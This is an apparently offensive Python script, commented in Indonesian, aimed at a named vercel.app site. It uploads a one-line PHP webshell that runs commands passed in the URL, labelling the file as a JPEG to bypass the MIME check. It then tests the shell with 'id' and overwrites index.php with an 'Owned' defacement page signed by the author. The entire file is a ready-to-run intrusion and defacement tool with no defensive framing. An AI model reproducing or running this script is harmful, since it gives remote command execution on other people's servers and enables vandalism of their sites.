import requests
import os

# Target: web dengan upload endpoint lemah (PHP)
TARGET_URL    = "https://winnie-5.vercel.app"
UPLOAD_PATH   = "/upload.php"          # endpoint upload
SHELL_NAME    = "x0.php"
WEBSHELL_PATH = f"/uploads/{SHELL_NAME}"

# PHP webshell minimal
WEBSHELL_CODE = b"<?php system($_GET['cmd']); ?>"

def upload_shell():
    files = {
        "file": (SHELL_NAME, WEBSHELL_CODE, "image/jpeg")  # bypass MIME check
    }
    r = requests.post(TARGET_URL + UPLOAD_PATH, files=files, timeout=10)
    print(f"[Upload] Status: {r.status_code}")
    return r.status_code == 200

def check_shell():
    r = requests.get(TARGET_URL + WEBSHELL_PATH + "?cmd=id", timeout=10)
    if r.status_code == 200:
        print(f"[Shell] Aktif — Output: {r.text.strip()}")
        return True
    return False

def deface(html_content: str):
    # Tulis file HTML defacement via shell
    # Encode HTML ke hex biar aman dari quote issue
    hex_content = html_content.encode().hex()
    cmd = f"echo '{hex_content}' | xxd -r -p > index.php"
    r = requests.get(
        TARGET_URL + WEBSHELL_PATH,
        params={"cmd": cmd},
        timeout=10
    )
    print(f"[Deface] Command sent — Status: {r.status_code}")

# HTML defacement kustom
DEFACE_HTML = """
<!DOCTYPE html>
<html>
<head>
  <title>Owned</title>
  <style>
    body { background: #000; color: #0f0; font-family: monospace;
           display: flex; align-items: center; justify-content: center;
           height: 100vh; margin: 0; flex-direction: column; }
    h1 { font-size: 4em; text-shadow: 0 0 20px #0f0; }
    p  { color: #888; }
  </style>
</head>
<body>
  <h1>Owned.</h1>
  <p>by AR0 // Onyx v67</p>
</body>
</html>
"""

if __name__ == "__main__":
    print("[*] Upload shell...")
    if upload_shell():
        print("[*] Cek shell...")
        if check_shell():
            print("[*] Defacing...")
            deface(DEFACE_HTML)
            print("[+] Done. Cek site-nya.")
        else:
            print("[-] Shell ga aktif — coba path lain.")
    else:
        print("[-] Upload gagal — coba endpoint lain.")